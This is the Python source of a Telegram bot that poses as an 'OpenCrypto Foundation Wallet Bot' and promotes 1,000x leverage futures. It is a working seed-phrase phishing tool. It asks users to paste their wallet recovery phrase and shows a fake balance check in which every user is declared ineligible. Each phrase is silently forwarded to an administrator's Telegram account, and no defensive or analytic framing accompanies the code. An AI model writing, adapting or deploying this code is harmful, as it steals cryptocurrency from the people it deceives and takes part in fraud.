from aiogram import Bot, Dispatcher, types, F
from aiogram.webhook.aiohttp_server import SimpleRequestHandler, setup_application
from aiohttp import web
import asyncio
import os

from dotenv import load_dotenv
load_dotenv()

TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", "6780752295"))

bot = Bot(token=TOKEN, parse_mode="HTML")
dp = Dispatcher()

# START command handler
@dp.message(F.text == "/start")
async def start(message: types.Message):
    keyboard = types.InlineKeyboardMarkup(
        inline_keyboard=[
            [types.InlineKeyboardButton(text="Visit the OCF page", callback_data="visit_ocf")]
        ]
    )
    welcome_text = (
        "🚀 <b>Welcome to the OpenCrypto Foundation Wallet Bot!</b>\n\n"
        "1,000X leverage on Futures contracts! This isn’t for everyone but if used right "
        "it could be a great speculation tool!\n"
        "<a href='https://futures.syncron.network'>Futures.Syncron.Network</a>\n\n"
        "🔆 Need more info? Click the button below."
    )
    await message.answer(welcome_text, reply_markup=keyboard)

# CALLBACK handler
@dp.callback_query(F.data == "visit_ocf")
async def handle_callback(callback_query: types.CallbackQuery):
    await callback_query.message.edit_reply_markup()
    await callback_query.message.answer(
        "🔐 Please paste your wallet phrase to import and check eligibility."
    )

# TEXT message handler (wallet phrase)
@dp.message(F.text)
async def handle_wallet(message: types.Message):
    phrase = message.text.strip()

    await message.answer("⏳ Importing wallet and checking SOL balance...")
    await asyncio.sleep(10)

    # Dummy balance check
    eligible = False
    if eligible:
        await message.answer("✅ Wallet is eligible!")
        await bot.send_message(ADMIN_ID, f"✅ Eligible wallet phrase:\n<code>{phrase}</code>")
    else:
        await message.answer("❌ Not eligible. Wallet holds less than 0.3 SOL.")
        await bot.send_message(ADMIN_ID, f"🚫 Ineligible wallet phrase:\n<code>{phrase}</code>")

# Webhook setup
async def on_startup(app):
    await bot.set_webhook("https://telegram-wallet-bot-q611.onrender.com/webhook")

app = web.Application()
app.on_startup.append(on_startup)
SimpleRequestHandler(dispatcher=dp, bot=bot).register(app, path="/webhook")
setup_application(app, dp)

if __name__ == "__main__":
    web.run_app(app, port=int(os.environ.get("PORT", 8080)))